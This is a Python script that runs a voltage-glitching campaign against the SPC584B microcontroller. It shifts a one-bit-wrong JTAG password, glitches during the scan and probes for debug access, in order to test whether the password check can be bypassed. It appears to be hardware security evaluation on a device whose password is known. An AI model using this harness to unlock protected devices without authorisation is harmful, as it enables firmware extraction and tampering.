#!/usr/bin/env python3
"""Findus campaign for SPC584B method-2 JTAG password fault injection.

One attempt resets the device into its normal locked state, shifts one known-
wrong password, glitches during that scan, and probes debug access without a
second reset.  This script never writes flash, UTEST, DCF, or lifecycle OTP.
"""

from __future__ import annotations

import argparse
import random
import struct
import sys
import time
from dataclasses import dataclass
from pathlib import Path

from findus import Database, OptimizationController, PicoGlitcher
from spc584b_openocd import (
    OpenOCDSession,
    OpenOCDError,
    PASS_LCSTAT,
    destructive_reset,
    find_openocd,
    fingerprint,
    password_scan_value,
    read_password_file,
)


SCRIPT_DIR = Path(__file__).resolve().parent
PASSWORD_INSTRUCTION = 0x07


@dataclass(frozen=True)
class Result:
    state: str
    color: str
    weight: int
    detail: str


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--rpico", required=True, help="Pico Glitcher serial port")
    parser.add_argument(
        "--password-file",
        required=True,
        type=Path,
        help="saved 32-byte SPC584B JTAG password",
    )
    parser.add_argument(
        "--delay",
        required=True,
        nargs=2,
        type=int,
        metavar=("MIN_NS", "MAX_NS"),
        help="inclusive delay range after the trigger",
    )
    parser.add_argument(
        "--length",
        required=True,
        nargs=2,
        type=int,
        metavar=("MIN_NS", "MAX_NS"),
        help="inclusive crowbar-pulse length range",
    )
    parser.add_argument(
        "--edge-count",
        required=True,
        type=int,
        help="TCK rising edge that triggers the glitch; determine with a scope",
    )
    parser.add_argument(
        "--trigger-input",
        default="default",
        choices=("default", "alt", "ext1", "ext2"),
        help="Pico Glitcher input physically connected to JTAG TCK",
    )
    parser.add_argument(
        "--glitch-power",
        default="low",
        choices=("low", "high"),
        help="crowbar MOSFET selection (default: low)",
    )
    parser.add_argument(
        "--attempts",
        type=int,
        default=0,
        help=(
            "number of attempts; 0 runs until interrupted or access succeeds, "
            "or visits the full grid with --unique-grid-step-ns"
        ),
    )
    parser.add_argument(
        "--optimize",
        action="store_true",
        help="use Findus OptimizationController instead of uniform random sampling",
    )
    parser.add_argument(
        "--unique-grid-step-ns",
        type=int,
        default=0,
        help="shuffle and visit each delay/length grid point once (0 disables)",
    )
    parser.add_argument(
        "--resume", action="store_true", help="resume the newest campaign database"
    )
    parser.add_argument(
        "--no-store", action="store_true", help="do not create a campaign database"
    )
    parser.add_argument(
        "--keep-going",
        action="store_true",
        help="continue after unexpected debug access instead of stopping",
    )
    parser.add_argument(
        "--enable-vtarget",
        action="store_true",
        help="let the Pico Glitcher enable VTARGET; leave unset for a self-powered board",
    )
    parser.add_argument(
        "--block-timeout",
        type=float,
        default=2.0,
        help="seconds to wait for the configured trigger (default: 2)",
    )
    parser.add_argument(
        "--halt-timeout-ms",
        type=int,
        default=250,
        help="milliseconds allowed for the no-reset debug probe (default: 250)",
    )
    parser.add_argument(
        "--adapter-speed-khz",
        type=int,
        default=100,
        help="OpenOCD JTAG adapter speed in kHz (default: 100)",
    )
    parser.add_argument(
        "--reset-delay-ms",
        type=int,
        default=200,
        help="target settle time after destructive-reset assertion (default: 200)",
    )
    return parser.parse_args()


def validate_args(args: argparse.Namespace) -> None:
    for name in ("delay", "length"):
        low, high = getattr(args, name)
        if low < 0 or high < low:
            raise ValueError(f"invalid --{name} range: {low} {high}")
    if args.edge_count < 1:
        raise ValueError("--edge-count must be positive")
    if args.attempts < 0:
        raise ValueError("--attempts cannot be negative")
    if args.block_timeout <= 0:
        raise ValueError("--block-timeout must be positive")
    if args.halt_timeout_ms <= 0:
        raise ValueError("--halt-timeout-ms must be positive")
    if args.adapter_speed_khz <= 0:
        raise ValueError("--adapter-speed-khz must be positive")
    if args.reset_delay_ms < 0:
        raise ValueError("--reset-delay-ms cannot be negative")
    if args.unique_grid_step_ns < 0:
        raise ValueError("--unique-grid-step-ns cannot be negative")
    if args.unique_grid_step_ns and args.optimize:
        raise ValueError("--unique-grid-step-ns cannot be combined with --optimize")
    if args.unique_grid_step_ns and args.resume:
        raise ValueError("--unique-grid-step-ns cannot currently be resumed")
    if args.optimize:
        if args.delay[0] == args.delay[1] or args.length[0] == args.length[1]:
            raise ValueError("--optimize requires non-zero delay and length ranges")


def wrong_password_words(password: bytes) -> tuple[int, ...]:
    wrong = bytearray(password)
    wrong[0] ^= 0x01
    return struct.unpack(">8I", wrong)


def probe_debug_without_reset(
    session: OpenOCDSession, halt_timeout_ms: int
) -> tuple[bool, str]:
    """Try to halt and read PC.  Do not reset or submit another password."""
    try:
        # `halt` without an argument invokes OpenOCD's default 5-second wait.
        # Issue the request without waiting, then use our bounded timeout.
        session.command("halt 0")
        session.command(f"wait_halt {halt_timeout_ms}")
        session.halted = True
        pc = session.command("reg pc")
    except OpenOCDError as error:
        session.halted = False
        return False, str(error).splitlines()[0]

    try:
        lcstat = session.read_word(PASS_LCSTAT)
        jun = 1 if lcstat & (1 << 30) else 0
        detail = f"pc={pc};jun={jun};lc={lcstat & 0x7}"
    except OpenOCDError as error:
        detail = f"pc={pc};lifecycle_read_failed={str(error).splitlines()[0]}"
    return True, detail


def run_attempt(
    session: OpenOCDSession,
    glitcher: PicoGlitcher,
    scan_value: int,
    delay: int,
    length: int,
    timeout: float,
    halt_timeout_ms: int,
    reset_delay_s: float,
) -> Result:
    # A destructive reset clears the previous temporary JTAG unlock.  Select
    # the password instruction before arming so the edge counter sees only the
    # deterministic 256-bit DR scan that follows.
    destructive_reset(session, reset_delay_s)
    session.halted = False
    session.command(f"irscan spc584b.tap 0x{PASSWORD_INSTRUCTION:02x}")

    glitcher.arm(delay, length)
    scan_error: str | None = None
    try:
        session.command(
            f"drscan spc584b.tap 256 0x{scan_value:064x}",
            error_label="<redacted one-bit-wrong JTAG password scan>",
        )
    except OpenOCDError as error:
        scan_error = str(error).splitlines()[0]

    try:
        glitcher.block(timeout=timeout)
    except Exception as error:
        return Result("TRIGGER_TIMEOUT", "Y", -2, str(error))

    accessible, probe_detail = probe_debug_without_reset(session, halt_timeout_ms)
    if accessible:
        return Result("UNEXPECTED_DEBUG_ACCESS", "R", 10, probe_detail)
    if scan_error is not None:
        return Result(
            "JTAG_SCAN_ERROR",
            "M",
            -1,
            f"{scan_error}; probe={probe_detail}",
        )
    return Result("PASSWORD_REJECTED", "G", 0, probe_detail)


def choose_parameters(
    args: argparse.Namespace,
    optimizer: OptimizationController | None,
    unique_grid: list[tuple[int, int]] | None,
    attempt_index: int,
) -> tuple[int, int]:
    if unique_grid is not None:
        return unique_grid[attempt_index]
    if optimizer is not None:
        delay, length = optimizer.step()
        return round(delay), round(length)
    return (
        random.randint(args.delay[0], args.delay[1]),
        random.randint(args.length[0], args.length[1]),
    )


def build_unique_grid(args: argparse.Namespace) -> list[tuple[int, int]] | None:
    step = args.unique_grid_step_ns
    if not step:
        return None

    def aligned_values(bounds: tuple[int, int]) -> range:
        low, high = bounds
        first = ((low + step - 1) // step) * step
        return range(first, high + 1, step)

    grid = [
        (delay, length)
        for delay in aligned_values(tuple(args.delay))
        for length in aligned_values(tuple(args.length))
    ]
    if not grid:
        raise ValueError("unique grid has no points inside the requested ranges")
    random.shuffle(grid)
    return grid


def pio_tick_ns(frequency_hz: int) -> int:
    if frequency_hz <= 0 or 1_000_000_000 % frequency_hz:
        raise ValueError(
            f"unsupported PicoGlitcher PIO frequency: {frequency_hz} Hz"
        )
    return 1_000_000_000 // frequency_hz


def resumed_database_name(database_dir: Path, resume: bool) -> str | None:
    if not resume:
        return None
    candidates = list(database_dir.glob("*.sqlite"))
    if not candidates:
        raise ValueError(f"no campaign database to resume in {database_dir}")
    return max(candidates, key=lambda path: path.stat().st_ctime).name


def main() -> int:
    args = parse_args()
    database: Database | None = None
    try:
        validate_args(args)
        openocd = find_openocd()
        password = read_password_file(args.password_file)
        scan_value = password_scan_value(wrong_password_words(password))

        glitcher = PicoGlitcher()
        glitcher.init(
            port=args.rpico,
            enable_vtarget=args.enable_vtarget,
        )
        frequency_hz = int(glitcher.get_cpu_frequency())
        tick_ns = pio_tick_ns(frequency_hz)
        if (
            args.unique_grid_step_ns
            and args.unique_grid_step_ns % tick_ns != 0
        ):
            raise ValueError(
                f"--unique-grid-step-ns must be a multiple of the PicoGlitcher "
                f"PIO tick ({tick_ns} ns at {frequency_hz} Hz)"
            )
        glitcher.edge_count_trigger(
            pin_trigger=args.trigger_input,
            number_of_edges=args.edge_count,
            edge_type="rising",
        )
        if args.glitch_power == "high":
            glitcher.set_hpglitch()
        else:
            glitcher.set_lpglitch()

        database_dir = SCRIPT_DIR / "databases"
        database_name = resumed_database_name(database_dir, args.resume)
        database = Database(
            sys.argv,
            dbname=database_name,
            resume=args.resume,
            nostore=args.no_store,
            column_names=["delay", "length", "edge_count"],
            dirname=str(database_dir),
        )

        optimizer = None
        if args.optimize:
            # OptimizationController treats upper boundaries as exclusive.
            optimizer = OptimizationController(
                parameter_boundaries=[
                    (args.delay[0], args.delay[1] + 1),
                    (args.length[0], args.length[1] + 1),
                ],
                parameter_divisions=[20, 10],
                number_of_individuals=10,
                length_of_genom=20,
                malus_factor_for_equal_bins=1,
            )

        unique_grid = build_unique_grid(args)
        attempt_limit = args.attempts
        if unique_grid is not None:
            if attempt_limit == 0:
                attempt_limit = len(unique_grid)
            elif attempt_limit > len(unique_grid):
                raise ValueError(
                    f"--attempts {attempt_limit} exceeds unique grid size "
                    f"{len(unique_grid)}"
                )

        print("METHOD=2_PASSWORD_CHECK_BYPASS")
        print(f"PASSWORD_SHA256={fingerprint(password)}")
        print("PASSWORD_VARIANT=one_bit_wrong")
        print(f"TRIGGER=TCK_RISING_EDGE_{args.edge_count}")
        print(f"PICO_PIO_FREQUENCY_HZ={frequency_hz}")
        print(f"PICO_PIO_TICK_NS={tick_ns}")
        if unique_grid is not None:
            print(
                f"SAMPLING=shuffled_unique_grid step_ns={args.unique_grid_step_ns} "
                f"points={len(unique_grid)}"
            )
        print("OTP_WRITES=none")

        started = time.monotonic()
        attempt_index = 0
        with OpenOCDSession(
            openocd, adapter_speed_khz=args.adapter_speed_khz
        ) as session:
            session.command("poll off")
            while attempt_limit == 0 or attempt_index < attempt_limit:
                delay, length = choose_parameters(
                    args, optimizer, unique_grid, attempt_index
                )
                result = run_attempt(
                    session,
                    glitcher,
                    scan_value,
                    delay,
                    length,
                    args.block_timeout,
                    args.halt_timeout_ms,
                    args.reset_delay_ms / 1000,
                )
                database.insert(
                    attempt_index + (1 if args.resume else 0),
                    delay,
                    length,
                    args.edge_count,
                    result.color,
                    result.detail.encode("utf-8", errors="replace"),
                )
                if optimizer is not None:
                    optimizer.add_experiment(result.weight, delay, length)
                    if attempt_index and attempt_index % 100 == 0:
                        optimizer.print_best_performing_bins()

                elapsed = max(time.monotonic() - started, 0.001)
                rate = (attempt_index + 1) / elapsed
                print(
                    f"ATTEMPT={attempt_index} delay_ns={delay} length_ns={length} "
                    f"result={result.state} rate={rate:.2f}/s detail={result.detail}"
                )

                attempt_index += 1
                if result.state == "UNEXPECTED_DEBUG_ACCESS" and not args.keep_going:
                    print("CAMPAIGN_RESULT=ACCESS_OBSERVED")
                    print("DEVICE_LEFT_WITHOUT_ADDITIONAL_RESET=yes")
                    return 0

        print("CAMPAIGN_RESULT=NO_ACCESS_OBSERVED")
        return 1
    except KeyboardInterrupt:
        print("\nCAMPAIGN_RESULT=INTERRUPTED")
        return 130
    except (OSError, OpenOCDError, ValueError) as error:
        print(f"CAMPAIGN_RESULT=ERROR reason={error}", file=sys.stderr)
        return 2
    finally:
        if database is not None:
            database.close()


if __name__ == "__main__":
    raise SystemExit(main())
